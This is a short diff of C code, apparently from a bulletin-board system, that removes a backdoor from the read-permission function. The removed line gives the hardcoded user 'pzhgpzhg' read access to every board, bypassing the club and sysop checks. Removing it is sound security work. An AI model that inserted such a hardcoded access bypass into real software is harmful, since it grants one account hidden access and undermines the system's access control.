@@ -109,7 +109,6 @@ int updatelastpost(char *board)
 int
 hasreadperm(struct boardheader *bh)
 {
-	if (!strcmp(currentuser.userid, "pzhgpzhg")) return 1;
 	if (bh->clubnum != 0)
 		return ((HAS_CLUBRIGHT(bh->clubnum, uinfo.clubrights))
 			|| (bh->flag & CLUBTYPE_FLAG) || HAS_PERM(PERM_SYSOP, currentuser));
